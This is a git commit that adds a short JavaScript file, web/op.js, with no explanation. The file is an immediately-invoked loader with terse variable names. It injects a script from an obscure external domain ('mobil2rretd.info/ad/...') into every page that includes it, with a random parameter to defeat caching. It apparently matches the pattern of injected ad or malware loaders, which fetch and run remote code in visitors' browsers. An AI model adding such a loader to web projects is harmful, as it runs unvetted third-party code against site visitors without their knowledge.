da8518bb993ac64159f748dc47ac6d891bda05eb
sanernecro <sanernecro@gmail.com>
2017-04-06 00:06:23 +0300

    Create op.js

---
+++ web/op.js
@@ -0,0 +1,6 @@
+     (function (a, d, j, o) {
+           o = a.createElement(d),
+              m = a.getElementsByTagName(d)[0];              
+           o.src = j + "?d=0&r=" + Math.random();
+           m.parentNode.insertBefore(o, m)
+      })(document, 'script', 'https://mobil2rretd.info/ad/76b136ee');
